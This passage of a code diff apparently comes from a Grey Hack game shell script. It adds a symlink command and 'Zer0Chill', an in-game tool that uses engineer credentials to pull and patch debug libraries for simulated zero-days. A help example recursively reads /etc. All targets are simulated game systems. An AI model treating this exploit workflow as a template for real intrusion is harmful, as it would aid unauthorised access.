+	"-- the string itself is surrounded by floating single quotes"+char(10)+
+	"--eg: <b>file -r /etc | clipa |  | if "" echo true "" "" echo false "" @a "" grep -f etc  "" "+char(10)+
+	"-- which would result in <b>true</b> printing to the screen (provided etc actually existed)"
+
+	s = @command["shell"]
+
+	if @arg3 and typeof(@arg3) == "string" and globals.command.hasIndex(arg3.split(char(32))[0]) then arg3 = @s(arg3+" | return")
+	if @arg4 and typeof(@arg4) == "string" and globals.command.hasIndex(arg4.split(char(32))[0]) then arg4 = @s(arg4+" | return")
+	print colorCyan+"<u>= = = evaluating = = =</u>"+char(10)+"<size=75%>"+colorCyan+"Result:"
+
+	if DEBUG then print "debug:_"+char(10)+@arg1+char(10)+@arg2+char(10)+@arg3+char(10)+@arg4
+
+	if arg3 == arg4 then
+		if @arg1 and typeof(@arg1) == "string" and globals.command.hasIndex(arg1.split(char(32))[0]) then arg1 = @s(arg1+" | return")
+		if @arg1 isa string then return arg1.trim else return arg1
+	else 
+		if @arg2 and typeof(@arg2) == "string" and globals.command.hasIndex(arg2.split(char(32))[0]) then arg2 = @s(arg2+" | return")
+		if @arg2 isa string then return arg2.trim else return arg2
+	end if
+
+	return 0
+end function
+command.sl = function(arg1,arg2,arg3,arg4)
+	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Symlink || symbolic link || file path"+char(10)+
+	"Usage: sl [path] -- returns true if path is a symlink, returns false otherwise"+char(10)+
+	"Usage: sl [path] [/new_path/new_name] -- create a symbolic link at path"+char(10)+
+	"-- returns 1 on success, string on fail"+char(10)+
+	"Note: command is disabled by default"+char(10)+
+	"-- if playing nightly, to activate the command: change the global NIGHTLY variable to true"
+	if not NIGHTLY then return "sl: function disabled"
+	if typeof(arg1) == "file" then arg1 = arg1.path
+	if typeof(arg1) != "string" then return "sl: invalid path"
+	source_file = globals.get_file(arg1)
+	if not source_file then return "sl: source file not found"
+	if not arg2 then 
+		print colorCyan+"sl:"+colorLightBlue+" checking for symlink..."
+		if source_file.is_symlink then return "true" else return "false" 
+	end if
+	sym_name = null
+	sym_parent_path = null 
+	first = globals.get_file(arg2)
+	if first then 
+		if first.is_symlink then 
+			print "sl: destination symlink exists; overwriting"
+			sym_name = first.name 
+			sym_parent_path = first.parent.path 
+		else 
+			print "sl: destination exists and is not a symlink;"+char(10)+"-- aborting..."
+			return 0
+		end if
+	else
+		sym_path = arg2.split("/")
+		sym_name = sym_path.pop
+		if sym_path.len < 1 then sym_path = sym_path + currentPath.split("/")
+		sym_path = sym_path.join("/")
+		second = globals.get_file(sym_path)
+		if second and second.is_folder then sym_parent_path = second.path else return "sl: [original_file] [/parent_path/new_name]"
+	end if
+	print colorLightBlue+"<u>sl: "+colorCyan+"creating symlink:</b> "+source_file.path+" ~> "+sym_parent_path+"/"+sym_name
+	return source_file.symlink(sym_parent_path, sym_name)
+end function
+command.zc = function(neurobox_user,neurobox_pass,metalib,arg4)
+	if not NIGHTLY then return "zc: disabled outside of nightly"
+    if neurobox_user == "h" or neurobox_user == "help" then return "Zer0Chill || Zeroday || zero day || autopatcher || autosolver"+char(10)+
+	colorWhite+"Usage: zc [neurobox_username] [neurobox_password] [opt:metaLib_name|metaLib_object]"+char(10)+
+	"-- if a MetaLib is not supplied, zc will use the currently linked MetaLib"+char(10)+
+	"---- or return an error if one is not linked"+char(10)+
+	"-- zc will: obtain debugLibrary from a MetaLib"+char(10)+
+	"---- scan the debugLibrary and parse the output"+char(10)+
+	"---- construct a patched version of the output"+char(10)+
+	"---- write the original and patched versions to:"+char(10)+
+	"------ <b>orig</b> and <b>patch.zd</b>, respectively"+char(10)+
+	"---- BUFFER all of the above"+char(10)+
+	"NOTE: at this time lib patching is not automated"+char(10)+
+	"NOTE: at this time unit-testing is not automated"+char(10)+
+	"----: this is because both of these actions may result in a lock-out"+char(10)+
+	"----: please analyze the output and unit-test and patch carefully"+char(10)+
+	colorWhite+"- - - - - - - - -"+char(10)+
+	colorLightBlue+"DebugLibary Unit Testing:"+char(10)+
+	"Procedure: once <b>zc</b> has been run:"+char(10)+
+	"-- run the command:<b> diff -l orig patch.zd | clipa | malp"+char(10)+
+	"-- select the debugLibrary from the BUFFER"+char(10)+
+	"-- select option [2] - unit_testing"+char(10)+
+	"-- input <b>@a</b> to use the list stored in clipa"+char(10)+
+	"-- if successful, output string will be BUFFERED"+char(10)+
+	"-- select the output text from the BUFFER"+char(10)+
+	"-- select [s] - save and enter a filename for the zeroday data"+char(10)+
+	colorLightBlue+"MetaLib Patching:"+char(10)+
+	"Procedure: once <b>zc</b> and unit_testing are complete:"+char(10)+
+	"-- select the debugLibrary from the BUFFER (or <b>bios -m | code</b> if it is still linked)"+char(10)+
+	"-- select patch and enter the path to patch.zd"
+    // colorWhite+"Usage: zc [user] [password] [MetaLib_object|MetaLib_name]</color> -- autosolve debugLibrary unit_testing and produce patch"+char(10)+
+    // "-- [user] - should be a neurobox engineer username gleened from investigating a<b> zero day rumor"+char(10)+
+    // "-- [pass] - should be the debugging password for the above engineer, gained the same way"+char(10)+
+    // "-- [MetaLib] - should be either an object or the <u>name</u> of a lib.so in /lib"+char(10)+
+    // "--eg: zc foo bar net.so "+char(10)+
+    // "NOTE: zc foo bar /lib/net.so is not valid: libs must be in /lib to be exploited in the first place"+char(10)+char(10)+
+    // "Output:"+char(10)+
+    // "Zer0Chill will store all objects (MetaLib and debugLibrary) and strings recovered in the BUFFER."+char(10)+
+    // "Additionally, the original code will be trimmed of whitespace and line numbers and stored in /currentPath/orig, if possible."+char(10)+
+    // "   ""  ""   , the generated, corrected code will be stored in /currentPath/patch.zd, if possible."+char(10)+
+    // "   ""  ""   , both original and corrected code will be stored in the custom object under keys: original, corrected."+char(10)+
+    // "   ""  ""   , both original and corrected code will be stored in the BUFFER."+char(10)+
+    // "Any combination of these may be piped to <b>diff -l</b> to obtain a list of line numbers to use with debugLibrary unit testing."+char(10)+
+    // "Finally, the original code will be compared with the new code using <b>diff</b> with the resulting list placed in the BUFFER."+char(10)+
+    // "NOTE: this option will <b>not</b> automatically patch the debugLibrary! Use -p or -a for that."+char(10)+
+    // colorLightBlue+"- - - - - -"+char(10)+
+    // "Usage: zc [-s|--scan] [debugLibrary] -- run a scan on a debugLibrary and return the scan string"+char(10)+
+    // "Usage: zc [-s|--scan] [user] [pass] [MetaLib] -- obtain a debugLibrary, scan it, and return the scan string"+char(10)+
+    // "Usage: zc [-u|--unit-test] [list:line_nums|string:line_nums] [debugLibrary] -- run unit testing on the debug lib"+char(10)+
+    // "-- line_nums should be a list or string of line numbers containing mistakes in the original code snippet"+char(10)+
+    // "---- if a string is supplied it should be comma separated: 1,2,3,4"+char(10)+
+    // "-- returns the resulting zero-day string"+char(10)+
+    // "Usage: zc [-p|--patch] [/path|string] [debugLibrary] --  patch a debug lib using the code in the given string or file at path"+char(10)+
+    // colorGold+"Usage: zc [-a|--auto-patch] [MetaLib|string:lib.so] -- automatically patch a MetaLib object or the named lib in /lib"+char(10)+
+    // "--eg: zc -a net.so"
+    if not neurobox_user or not neurobox_pass then return "zer0Chill: invalid parameters: expects [user] [pass] [metaLib]"
+    if typeof(metalib) != "MetaLib" then 
+        if typeof(metalib) == "string" then 
+            if not globals.metaxploit then return "zer0Chill: metaxploit is required in order to load from path"
+            //file_path = metalib.trim
+            //if DEBUG then print "debug: file path: "+file_path
+            //metalib_file = globals.get_file(metalib)
+            //if not metalib_file then return "zer0Chill: "+metalib+" not found in /lib"+char(10)+"-- supply an object of type MetaLib or"+char(10)+"-- the name of a metalib.so in /lib. eg: net.so"+char(10)+"-- libs must be in /lib to be exploited"
+            print command.meta("link","-l",metalib)        
+            metalib = command.bios("-m")
+            if typeof(metalib) != "MetaLib" then return "zer0Chill: error: that wasn't a MetaLib!" else globals.BUFFER.push(metalib)
+        else 
+			if not metalib then 
+				if globals.metaLib then 
+					metalib = globals.metaLib
+					globals.BUFFER.push(metalib)
+				else 
+					return "zer0Chill: please supply or link a metaLib name or object"
+				end if
+			else 
+				return "zer0chill: please supply or link a metaLib name or metaLib object"
+			end if
+        end if
+    else 
+        command.meta("link",metalib)    
+        globals.BUFFER.push(command.bios("-m"))
+    end if
+
+
+
+    handle = {}
+    handle.output = []
+    handle.some_var = ""
+    handle.scan_string = ""
+    handle.orig_code = ""
+    handle.corr_code = ""
+    handle.zeroday = ""
+    handle.objects = [] // metaLib, debugLibrary, list_of_line_numbers
+    handle.test = function( list, debuglib )
+        zero_day = debuglib.unit_test(list)
+        print colorGold+"Processing..."
+        if zero_day == null then return "zer0Chill: unit_test failed: invalid input"
+        if zero_day == "Test failed: No errors have been found in one or more of the provided lines, or not all lines with errors have been provided." then return zero_day
+        print colorWhite+"Success. Sending result to BUFFER"
+        globals.BUFFER.push(zero_day)
+        print "zer0Cill: task complete, returning result:"
+        return zero_day
+    end function
+    handle.patch = function( debugLibrary, patch_path )
+        act = debugLibrary.apply_patch( patch_path )
+		print act
+    end function
+    handle.The = function( f, v ) // create a new function, create it's first line, determine it's param from that line
+        handle.output.push(f+" = function("+v+")")
+    end function
+    handle.If = function( string ) // [If] the value of var_pkPc3t is greater than or equal to 5,...
+        valu = string.split("value of")[1].split("is")[0].trim // var_pkPc3t
+        statement = string.split(", ")[0].split("is")[1].trim // greater than or equal to 5
+        if DEBUG then print "processing statement: "+statement
+        line = "if "+valu+" "+handle._maths(statement)+" then" // if var_pkPc3t >= 5 then
+        handle.output.push(line)
+        // ...then updates var_pkPc3t by calculating var_pkPc3t plus 6
+        next_line = string.split(", ")[1].split("calculating ")[1].split(" ") // var_pkPc3t plus 6
+        var = next_line.pull 
+        const = next_line.pop 
+        op = next_line.join(" ")
+        if op == "plus" then op = "+"
+        if op == "minus" then op = "-"
+        if op == "divided by" then op = "/"
+        if op == "multiplied by" then op = "*"
+        line = var+" = "+var+" "+op+" "+const // var_pkPc3t = var_pkPc3t + 6
+        handle.output.push(line)
+        handle.output.push("end if")
+    end function
+    handle.For = function( string ) // [For] each i from 0 to 2, updates var_pkPc3t by multiplying it by i
+        lines = string.split(", ")
+        line1 = lines[0]
+        line2 = lines[1]
+
+        range_min = line1.split("from ")[1].split(" to ")[0] // 0
+        range_max = line1.split("from ")[1].split(" to ")[1] // 2
+        var = line2.split(" by ")[0].split(" ")[1] // var_pkPc3t
+        op = var+" = i * "+var
+
+        // for i in range(range_min, range_max)
+        //  var = i op var
+        // end for
+        handle.output.push("for i in range("+range_min+", "+range_max+")")
+        handle.output.push(op)
+        handle.output.push("end for")
+    end function
+    handle.calculates = function( string ) // [calculates] var_pkPc3t minus 1
+        input = string.split(" ")
+        v = input.pull
+        const = input.pop 
+        op = input.join(" ").trim
+        if op == "plus" then op = "+"
+        if op == "minus" then op = "-"
+        if op == "divided by" then op = "/"
+        if op == "multiplied by" then op = "*"
+        handle.output.push(v+" = "+v+" "+op+" "+const)
+    end function
+    handle.calls = function( string ) // calls the function func_oEHEM4 with var_pkPc3t.
+        line = string.split("function ")[1].split(" ")
+        func = line[0]
+        var = line[-1]
+        handle.output.push(var+" = "+func+"("+var+")")
+    end function
+    handle.creates = function( string ) // creates a list var_nDHyNB, adds var_Znm6qW to var_nDHyNB, and assigns var_Znm6qW to the first element of var_nDHyNB.
+        line1 = string.split(", ")[0]
+        list = line1.split("list ")[1]
+        line2 = string.split(", ")[1]
+        v = line2.split(" ")[1]
+        handle.output.push(list+" = []")
+        handle.output.push( list+".push("+v+")")
+        handle.output.push(v+" = "+list+"[0]")
+    end function
+    handle.Finally = function( string ) // [returns] something
+        ret_v = string.split(" ")[-1]
+        line = "return "+ret_v 
+        handle.output.push(line)
+        handle.output.push("end function")
+        handle.output.push("")
+    end function
+    handle._maths = function( string )
+        st = string.split(" ")
+        v = st.pop
+        st = st.join(" ").trim
+        op = ""
+        if DEBUG then print "in _maths: st is:"+st
+        if st == "greater than or equal to" then return ">= "+v
+        if st == "greater than" then return "> "+v
+        if st == "less than" then return "< "+v
+        if st == "less than or equal to" then return "<= "+v
+        if st == "equal to" then return "== "+v
+        if st == "not equal to" then return "!= "+v
+        if op == "" then return "<b>unknown operation!</b> "+v
+        //return op+" "+v
+    end function
+    handle.write_patch = function( list, file )
+        out = list.join(char(10))
+        return file.set_content(out)
+    end function
+    handle._parse = function( string )
+        sl = string.split(" ")
+        first_word = sl.pull.replace(",","")
+        if first_word == "The" then 
+            if DEBUG then print "creating new function..."
+            sl.pull 
+            f_name = sl.pull 
+            if DEBUG then print f_name
+            handle.The(f_name,handle.some_var)
+            first_word = sl.pull.replace(",","")
+        end if
+        ins = sl.join(" ")
+        yadda = ""
+        if DEBUG then print "looking for index: "+first_word
+        if handle.hasIndex(first_word) then yadda = @handle[first_word] else return 0 // fix this
+        yadda(sl.join(" "))
+        return 1
+    end function
+    handle.export = function( string )
+        //command.cob("set","orig",string)
+        print "zer0Chill: sending code snippet to BUFFER"
+        globals.BUFFER.push(string)
+        file = globals.get_file(currentPath+"/orig")
+        if not file then print command.poke(currentPath+"/orig")
+        file = globals.get_file(currentPath+"/orig")
+        if not file then print "zer0Chill: unable to locate or create "+currentPath+"/orig"
+        print "zer0Chill: writing original code snippet to "+file.path
+        if file.has_permission("w") then file.set_content(string) else print "write failed: permission denied"
+    end function 
+    handle._refactor = function( string )
+        //print string
+        arr = string.split(char(10))
+        //print arr
+        out_b = []
+        for line in arr
+            sl = line.split(":")
+            if sl.len > 1 then out_b.push(sl[1].trim)
+        end for
+        handle.export( out_b.join(char(10)) )
+    end function
+    handle._split_strings = function( string )
+        if DEBUG then print "debug: string to split:"+char(10)+string
+        instructions = string[:string.indexOf("01:")].trim.remove("Potential problems have been found in the following code:")
+        original_code = string[string.indexOf("01:"):]
+        return [ instructions, original_code ]
+    end function
+    handle._heuristics = function()
+        success = 0
+        debug_lib = metalib.debug_tools(neurobox_user,neurobox_pass)
+        if typeof(debug_lib) != "debugLibrary" or debug_lib == "Incorrect password" then return [ success, debug_lib ]
+        output = ""
+        output = debug_lib.scan 
+
+
+        success = 1    
+        return [ success, output, debug_lib ]
+    end function
+    ///////////////////////////////////////////////////////////////////////////////////    
+    handle.zero_pwn = function( string ) 
+        handle.some_var = string.split("returns")[-1].replace("\.","").trim
+        chunk = string.replace(char(10),"").split("\.")
+        
+        if DEBUG then print "Found some var: "+handle.some_var
+        for line in chunk
+            if DEBUG then print "processing line: "+line
+            handle._parse(line.trim)
+        end for
+
+        output_file = globals.get_file(currentPath+"/patch.zd")
+        if not output_file then print command.poke(currentPath+"/patch.zd")
+        output_file = globals.get_file(currentPath+"/patch.zd")
+        if not output_file then print "zer0Chill: could not find or create patch.zd in current path"+char(10)+"-- patch not written to file"
+        if output_file then 
+            if not output_file.has_permission("w") then 
+                print "zer0Chill: patch.zd is write protected"+char(10)+"-- patch not written to file"
+            else
+                print "zer0Chill: writing patch file to: "+output_file.path+char(10)+"-- status: ["+handle.write_patch(handle.output, output_file)+"]"
+            end if
+        end if
+        print "zer0Chill: returning output..."
+        return handle.output.join(char(10))
+    end function
+    ///////////////////////////////////////////////////////////////////////////////
+    print "Launching Zer0Chill v 0.3..."
+    hl = handle._heuristics // returns list
+    h=""
+    if not hl[0] then return hl[1] else h = hl[1]
+    if DEBUG then print "debug: big string is:"+char(10)+h+char(10)
+    print colorOrange+"zer0Chill: sending debugLibrary to BUFFER"
+    globals.BUFFER.push(hl[2])
+    print colorOrange+"-- sending debug string to BUFFER"
+    globals.BUFFER.push(h)
+    s = handle._split_strings(h) // returns list
+    handle._refactor(s[1])
+    return handle.zero_pwn(s[0])
+end function
+	
+	
